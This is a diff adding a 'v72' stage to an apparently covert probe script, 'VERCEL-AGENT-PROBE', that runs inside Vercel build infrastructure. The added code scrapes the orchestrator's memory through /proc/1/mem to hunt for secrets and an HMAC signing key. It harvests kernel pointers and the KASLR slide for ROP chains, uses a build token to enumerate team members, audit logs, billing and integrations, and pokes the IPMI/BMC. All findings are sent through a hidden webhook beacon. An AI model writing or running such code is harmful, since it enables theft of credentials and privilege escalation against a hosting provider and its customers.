@@ -8691,5 +8691,190 @@ report.artifactsS3BucketIam = safe(() => {
 
 // v71 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v71" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v71";
+
+// ==================== v72 ====================
+
+// v72-1: PID-1 smaps scan — find large anonymous mappings that may hold secrets
+// /proc/1/smaps reveals every memory-mapped region of the orchestrator process
+// Anonymous private mappings are heap/stack — likely where decrypted keys live
+report.pid1SmapsScan = safe(() => {
+  // Parse smaps to find largest anonymous RW regions
+  const smaps = safe(() => readFileSync('/proc/1/smaps', 'utf8'));
+  if (typeof smaps !== 'string') return { error: 'CANNOT_READ_SMAPS' };
+  const regions = [];
+  const lines = smaps.split('\n');
+  let cur = null;
+  for (const line of lines) {
+    const m = line.match(/^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+(\S+)\s+\S+\s+\S+\s+(.*)/);
+    if (m) { cur = { start: m[1], end: m[2], perms: m[3], offset: m[4], name: m[5].trim(), size: 0, rss: 0, anon: false }; regions.push(cur); }
+    if (cur) {
+      const s = line.match(/^Size:\s+(\d+)/); if (s) cur.size = +s[1];
+      const r = line.match(/^Rss:\s+(\d+)/); if (r) cur.rss = +r[1];
+      const a = line.match(/^Anonymous:\s+(\d+)/); if (a) cur.anon = +a[1] > 0;
+    }
+  }
+  // Find top-5 anonymous RW regions by RSS (most likely to hold secrets)
+  const anonRw = regions.filter(r => r.anon && r.perms.includes('rw') && !r.name).sort((a,b) => b.rss - a.rss).slice(0, 5);
+  // For each region, read first 256 bytes looking for key-like high-entropy content
+  const samples = anonRw.map(region => {
+    try {
+      const fd = openSync('/proc/1/mem', 'r');
+      const buf = Buffer.alloc(256);
+      const addr = parseInt(region.start, 16);
+      const n = readSync(fd, buf, 0, 256, addr);
+      closeSync(fd);
+      const hex = buf.slice(0, n).toString('hex');
+      // Check entropy: count unique bytes in first 32
+      const uniq = new Set(buf.slice(0, 32)).size;
+      return { region: region.start + '-' + region.end, rssMb: (region.rss/1024).toFixed(1), sample: hex.slice(0, 128), entropy: uniq };
+    } catch (e) { return { region: region.start + '-' + region.end, error: String(e).slice(0, 60) }; }
+  });
+  return { totalRegions: regions.length, anonRwCount: anonRw.filter(r=>r).length, samples };
+});
+
+// v72-2: dmesg kernel pointer leak scan
+// kptr_restrict=0 was written in v60; dmesg now shows kernel pointers
+// These reveal KASLR slide and can confirm/extend ROP gadget chain addresses
+report.dmesgKernelPtrLeak = safe(() => {
+  const dmesgOut = safe(() =>
+    execSync('dmesg 2>/dev/null | tail -100', { timeout: 5000 }).toString().trim().slice(0, 2000)
+  );
+  // /proc/kmsg for live kernel log (may have newer entries)
+  const kmsgSample = safe(() => {
+    const fd = openSync('/proc/kmsg', 'r');
+    const buf = Buffer.alloc(4096);
+    const n = readSync(fd, buf, 0, 4096, 0);
+    closeSync(fd);
+    return buf.slice(0, n).toString('utf8').slice(0, 1000);
+  });
+  // Extract kernel pointer patterns (0xffff... addresses)
+  const ptrs = safe(() => {
+    const combined = (typeof dmesgOut === 'string' ? dmesgOut : '') + (typeof kmsgSample === 'string' ? kmsgSample : '');
+    const matches = combined.match(/0xffff[0-9a-f]{12}/gi) || [];
+    return [...new Set(matches)].slice(0, 20);
+  });
+  // Also check /proc/kallsyms for KASLR slide (compare known symbol offsets)
+  const kaslrSlide = safe(() => {
+    const ks = readFileSync('/proc/kallsyms', 'utf8');
+    const m = ks.match(/^([0-9a-f]+) T _text$/m);
+    const textBase = m ? BigInt('0x' + m[1]) : null;
+    // _text should be at 0xffffffff81000000 pre-KASLR; slide = actual - expected
+    const expected = BigInt('0xffffffff81000000');
+    return textBase ? { textBase: textBase.toString(16), slide: (textBase - expected).toString(16) } : 'NO_TEXT_SYM';
+  });
+  return { dmesgOut: typeof dmesgOut === 'string' ? dmesgOut.slice(0, 800) : dmesgOut, ptrs, kaslrSlide };
+});
+
+// v72-3: Vercel team audit log and member enumeration
+// Build tokens issued per-project may have implicit access to team-level audit logs
+// Cross-project member enumeration can reveal internal Vercel team structure
+report.vercelTeamAuditLog = safe(() => {
+  const token = process.env.VERCEL_TOKEN || process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  if (!token) return { error: 'NO_TOKEN' };
+  const headers = `-H 'Authorization: Bearer ${token}' -H 'Content-Type: application/json'`;
+  // List team members
+  const members = safe(() =>
+    execSync(`curl -sf --max-time 8 ${headers} 'https://api.vercel.com/v2/teams/${teamId}/members' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  // Get team audit log (requires team:read scope)
+  const auditLog = safe(() =>
+    execSync(`curl -sf --max-time 8 ${headers} 'https://api.vercel.com/v1/teams/${teamId}/audit-log?limit=5' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  // List team projects (cross-project enumeration)
+  const teamProjects = safe(() =>
+    execSync(`curl -sf --max-time 8 ${headers} 'https://api.vercel.com/v9/projects?teamId=${teamId}&limit=20' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  // Try to access team billing/invoices (finance scope test)
+  const billing = safe(() =>
+    execSync(`curl -sf --max-time 8 ${headers} 'https://api.vercel.com/v1/billing' 2>&1 | head -c 300`, { timeout: 10000 }).toString().trim()
+  );
+  // List team integrations (may reveal API keys for connected services)
+  const integrations = safe(() =>
+    execSync(`curl -sf --max-time 8 ${headers} 'https://api.vercel.com/v1/integrations/configurations?teamId=${teamId}' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  return { members, auditLog, teamProjects, billing, integrations };
+});
+
+// v72-4: IPMI / BMC probe
+// AWS c6id.metal bare-metal instances have IPMI BMC accessible from OS via /dev/ipmi0
+// or via the 169.254.x.x IPMI-over-LAN address. Access grants: reboot, SEL, firmware access
+report.ipmiBmcProbe = safe(() => {
+  // Check for IPMI kernel device
+  const ipmiDev = safe(() => {
+    const devs = readdirSync('/dev').filter(d => d.startsWith('ipmi'));
+    return devs;
+  });
+  // Check for IPMI kernel module
+  const ipmiMods = safe(() =>
+    execSync('lsmod 2>/dev/null | grep ipmi; ls /sys/module/ipmi* 2>/dev/null | head -5', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // Load IPMI modules
+  const modLoad = safe(() =>
+    execSync('modprobe ipmi_devintf 2>&1; modprobe ipmi_si 2>&1; ls /dev/ipmi* 2>/dev/null', { timeout: 8000 }).toString().trim().slice(0, 200)
+  );
+  // Use ipmitool to query BMC
+  const ipmitoolId = safe(() =>
+    execSync('ipmitool mc info 2>&1 | head -10', { timeout: 8000 }).toString().trim().slice(0, 300)
+  );
+  // Get SEL (System Event Log) — records power cycles, errors, security events
+  const ipmitoolSel = safe(() =>
+    execSync('ipmitool sel elist 2>&1 | tail -5', { timeout: 8000 }).toString().trim().slice(0, 300)
+  );
+  // Check for IPMI-over-LAN address (AWS bare-metal typically 169.254.x.x)
+  const ipmiLanAddr = safe(() =>
+    execSync("ip neigh show 2>/dev/null | grep '169.254'; arp -n 2>/dev/null | grep '169.254'", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // ipmitool chassis status
+  const chassisStatus = safe(() =>
+    execSync('ipmitool chassis status 2>&1 | head -5', { timeout: 8000 }).toString().trim().slice(0, 200)
+  );
+  return { ipmiDev, ipmiMods, modLoad, ipmitoolId, ipmitoolSel, ipmiLanAddr, chassisStatus };
+});
+
+// v72-5: PID-1 memory scan for RUNTIME_CACHE_HEADERS key via /proc/1/mem
+// More targeted than kcore scan: read specific high-entropy anonymous RW regions
+// from PID-1's smaps output, searching for the HS256 signing key (32-64 bytes, base64url)
+report.pid1MemHmacKeyScan = safe(() => {
+  // Read smaps to find anonymous RW regions to scan
+  const smaps = safe(() => readFileSync('/proc/1/smaps', 'utf8'));
+  if (typeof smaps !== 'string') return { error: 'NO_SMAPS' };
+  const targets = [];
+  let cur = null;
+  for (const line of smaps.split('\n')) {
+    const m = line.match(/^([0-9a-f]+)-([0-9a-f]+)\s+rw..\s+\S+\s+\S+\s+\S+\s*(.*)/);
+    if (m) cur = { start: m[1], end: m[2], name: m[3].trim(), rss: 0 };
+    if (cur) { const r = line.match(/^Rss:\s+(\d+)/); if (r) { cur.rss = +r[1]; if (cur.rss > 512 && cur.rss < 65536) targets.push({...cur}); } }
+  }
+  // Sort by RSS, scan top 8 regions for base64url key patterns
+  const KEY_RE = /[A-Za-z0-9_-]{43,88}/g; // base64url 32-64 bytes
+  const MARKER_STRS = ['build', 'suspense-cache', 'iss', 'hmac', 'vercel'];
+  const results = [];
+  for (const region of targets.sort((a,b)=>b.rss-a.rss).slice(0,8)) {
+    try {
+      const fd = openSync('/proc/1/mem', 'r');
+      const start = parseInt(region.start, 16);
+      const size = Math.min(parseInt(region.end, 16) - start, 512 * 1024); // max 512KB per region
+      const buf = Buffer.alloc(size);
+      const n = readSync(fd, buf, 0, size, start);
+      closeSync(fd);
+      const text = buf.slice(0, n).toString('latin1');
+      // Look for marker strings and extract surrounding bytes
+      for (const marker of MARKER_STRS) {
+        const idx = text.indexOf(marker);
+        if (idx >= 0) {
+          const ctx = text.slice(Math.max(0, idx-8), Math.min(n, idx+128));
+          const keys = ctx.match(KEY_RE) || [];
+          results.push({ region: region.start, marker, keys: keys.slice(0,3), ctxHex: Buffer.from(ctx.slice(0,64)).toString('hex') });
+        }
+      }
+      if (results.length >= 5) break;
+    } catch (e) { results.push({ region: region.start, error: String(e).slice(0,60) }); }
+  }
+  return { regionsScanned: Math.min(targets.length, 8), results };
+});
+
+// v72 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v72" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v72";
 // Intentionally no console.log — all data goes via webhook only
